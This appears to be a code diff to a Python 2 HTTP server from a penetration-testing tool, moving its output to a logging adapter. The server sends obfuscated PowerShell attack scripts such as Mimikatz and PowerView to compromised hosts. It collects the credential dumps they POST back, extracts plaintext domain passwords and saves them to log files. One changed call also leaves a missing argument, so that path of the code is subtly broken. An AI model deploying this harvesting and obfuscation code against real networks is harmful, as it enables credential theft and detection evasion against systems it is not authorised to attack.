@@ -1,8 +1,9 @@
 from BaseHTTPServer import BaseHTTPRequestHandler
 from threading import Thread
-from core.logger import *
 from datetime import datetime
 from StringIO import StringIO
+from core.logger import CMEAdapter
+import logging
 import core.settings as settings
 import os
 import re
@@ -16,13 +17,14 @@ synopsis  = re.compile('<#.+#>')
 class MimikatzServer(BaseHTTPRequestHandler):
 
     def log_message(self, format, *args):
-        print_message("%s - - %s" % (self.client_address[0], format%args))
+        cme_logger = logging.getLogger('CME')
+        cme_logger.info("%s - - %s" % (self.client_address[0], format%args))
 
-    def save_mimikatz_output(self, data):
+    def save_mimikatz_output(self, data, cme_logger):
         log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
         with open('logs/' + log_name, 'w') as creds:
             creds.write(data)
-        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
+        cme_logger.info("Saved Mimikatz's output to {}".format(log_name))
 
     def do_GET(self):
         if self.path[1:].endswith('.ps1') and self.path[1:] in os.listdir('hosted'):
@@ -33,7 +35,7 @@ class MimikatzServer(BaseHTTPRequestHandler):
                 if self.path[1:] != 'powerview.ps1':
                     logging.info('Obfuscating Powershell script')
                     ps_script = eval(synopsis.sub('', repr(ps_script))) #Removes the synopsys
-                    ps_script = func_name.sub(settings.args.obfs_func_name, ps_script) #Randomizes the function name
+                    ps_script = func_name.sub(settings.obfs_func_name, ps_script) #Randomizes the function name
                     ps_script = comments.sub('', ps_script) #Removes the comments
                     #logging.info('Sending the following modified powershell script: {}'.format(ps_script))
                 self.wfile.write(ps_script)
@@ -55,6 +57,11 @@ class MimikatzServer(BaseHTTPRequestHandler):
         length = int(self.headers.getheader('content-length'))
         data = self.rfile.read(length)
 
+        cme_logger = CMEAdapter(logging.getLogger('CME'), {'host': self.client_address[0],
+                                                           'port': self.client_address[1],
+                                                           'service': 'PARSER',
+                                                           'hostname': ''})
+
         if settings.args.mimikatz:
             try:
                 buf = StringIO(data).readlines()
@@ -70,30 +77,30 @@ class MimikatzServer(BaseHTTPRequestHandler):
                     i += 1
 
                 if plaintext_creds:
-                    print_succ('{} Found plain text credentials (domain\\user:password):'.format(self.client_address[0]))
+                    cme_logger.success('Found plain text credentials (domain\\user:password)')
                     for cred in plaintext_creds:
-                        print_att(u'{}'.format(cred))
+                        cme_logger.results(u'{}'.format(cred))
             except Exception as e:
-                print_error("Error while parsing Mimikatz output: {}".format(e))
+                cme_logger.error("Error while parsing Mimikatz output: {}".format(e))
 
-            self.save_mimikatz_output(data)
+            self.save_mimikatz_output(data, cme_logger)
 
         elif settings.args.mimikatz_cmd:
-            print_succ('{} Mimikatz command output:'.format(self.client_address[0]))
-            print_att(data)
+            cme_logger.success('Got Mimikatz command output')
+            cme_logger.results(data)
             self.save_mimikatz_output(data)
 
         elif settings.args.powerview and data:
-            print_succ('{} PowerView command output:'.format(self.client_address[0]))
+            cme_logger.success('Got PowerView command output')
             buf = StringIO(data.strip()).readlines()
             for line in buf:
-                print_att(line.strip())
+                cme_logger.results(line.strip())
 
         elif settings.args.gpp_passwords and data:
-            print_succ('{} Get-GPPPasswords output:'.format(self.client_address[0]))
+            cme_logger.success('Got Get-GPPPasswords output')
             buf = StringIO(data.strip()).readlines()
             for line in buf:
-                print_att(line.strip())
+                cme_logger.results(line.strip())
 
 def http_server(port):
     http_server = BaseHTTPServer.HTTPServer(('0.0.0.0', port), MimikatzServer)
